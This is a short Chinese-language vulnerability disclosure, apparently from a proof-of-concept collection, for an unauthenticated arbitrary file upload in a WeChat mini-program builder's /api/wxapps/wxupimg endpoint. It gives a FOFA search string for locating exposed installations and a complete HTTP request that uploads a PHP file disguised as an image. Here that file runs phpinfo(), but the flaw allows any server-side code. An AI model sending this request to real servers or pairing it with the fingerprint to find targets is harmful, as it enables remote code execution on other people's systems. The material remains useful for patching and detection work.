# 全行业小程序运营系统接口Wxapps.php存在任意文件上传漏洞

 **全行业小程序运营系统是一个无需编程，各行业模版直接套用，一键生成，轻松搭建小程序，界面自由DIY，同步实时预览，可视化操作让您所见即所得，随心打造个性小程序。** **接口位于`/api/controller/Wxapps.php`控制器的`wxupimg`方法使用`ThinkPHP`原生上传函数 file() 上传文件，且未有过滤，导致漏洞产生。**

## fofa

```YAML
"/com/css/head_foot.css"
```

## POC

```yaml
POST /api/wxapps/wxupimg HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNGBhBIC624F4IANg
Host: 127.0.0.1:81
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

![image-20240714133917110](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407141339209.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/-6lYJFmRJUYHd1O-yFXZMg